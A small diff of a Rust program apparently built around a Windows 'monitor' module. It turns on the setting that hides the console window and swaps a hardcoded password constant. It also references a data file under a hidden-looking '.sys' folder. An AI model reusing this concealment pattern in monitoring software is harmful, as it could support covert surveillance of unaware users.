@@ -1,4 +1,4 @@
-//#![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
@@ -15,7 +15,7 @@ use linkify::{LinkFinder, LinkKind};
 use monitor::*;
 
 const TEMP: &str = ".sys/data.dat";
-const PASS: &[u8] = b"firemouses!";
+const PASS: &[u8] = b"test!";
 
 fn main() {
     #[derive(Copy, Clone, Eq, PartialEq, Debug)]
